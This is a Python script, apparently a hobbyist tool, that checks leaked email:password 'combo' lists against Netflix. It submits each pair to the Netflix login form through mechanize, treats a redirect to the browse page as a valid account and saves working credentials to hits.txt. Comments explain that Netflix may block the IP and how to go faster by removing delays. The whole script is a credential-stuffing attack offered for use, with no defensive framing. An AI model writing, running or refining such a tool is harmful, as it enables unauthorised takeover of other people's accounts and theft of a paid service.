from colorama import Fore, Back, Style
from fake_useragent import UserAgent as ua
import mechanize
import time
import urllib
import platform
import os


# art
art = """
        ██████  ██████  ██████  ███████ ██████      ██████  ██    ██     ███    ██  ██████   ██ ███████ ███████ 
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██  ██  ██      ████   ██ ██    ██ ███ ██      ██      
        ██      ██    ██ ██   ██ █████   ██   ██     ██████    ████       ██ ██  ██ ██    ██  ██ ███████ █████   
        ██      ██    ██ ██   ██ ██      ██   ██     ██   ██    ██        ██  ██ ██ ██    ██  ██      ██ ██      
        ██████  ██████  ██████  ███████ ██████      ██████     ██        ██   ████  ██████   ██ ███████ ███████ 
                                                1.0                                                                 
"""

art2 = """
        ██████╗ ██████╗ ██████╗ ███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ██╗ ██████╗  ██╗███████╗███████╗
        ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗  ██║██╔═══██╗███║██╔════╝██╔════╝
        ██║     ██║   ██║██║  ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔██╗ ██║██║   ██║╚██║███████╗█████╗  
        ██║     ██║   ██║██║  ██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╗██║██║   ██║ ██║╚════██║██╔══╝  
        ╚██████╗╚██████╔╝██████╔╝███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚████║╚██████╔╝ ██║███████║███████╗
        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═══╝ ╚═════╝  ╚═╝╚══════╝╚══════╝
                                                2.0
"""

#clear function ofcoure easyyyy
def clear():
    windowsclear = "cls"
    linuxclear = "clear"
    if platform.system() == 'Windows':
        os.system(windowsclear)
    else:
        os.system(linuxclear)


#My Amazing intro
def intro():
    print(Fore.RED + art)
    time.sleep(0.5)
    clear()
    print(Fore.BLUE + art2)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTCYAN_EX + art)
    time.sleep(0.5)
    clear()
    print(Fore.LIGHTMAGENTA_EX + art2)





#br
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]



#Checker function
def checker():
    with open("combo.txt", "r") as filestream:
        for line in filestream:
            try:
                br.open('https://www.netflix.com/fr/login')
                currentline = line.split(':')
                br.select_form(nr=0)
                br.form['userLoginId'] = currentline[0]
                br.form['password'] = currentline[1]
                response = br.submit()

                if response.geturl()=='https://www.netflix.com/browse':
                    print(f"{Fore.GREEN}[+] Account: {currentline[0]}:{currentline[1]} is Valid")
                    print(f"{Fore.CYAN}Saved to hits.txt")
                    br.open('https://www.netflix.com/SignOut?lnkctr=mL')
                    with open("hits.txt", "w") as hits:
                        hits.write(f"{currentline[0]}:{currentline[1]}")
                    # If you want it to work faster you can remove or edit the time function below 
                    time.sleep(2)
                else:
                    print(f"{Fore.RED}[!] Account: {currentline[0]}:{currentline[1]} is Invalid ")
                    # Same here as above
                    time.sleep(2)
            except:
                print(f"{Fore.YELLOW}Error: Netflix probably blocked your IP due to multiple login attempts.")



clear()
intro()    
checker()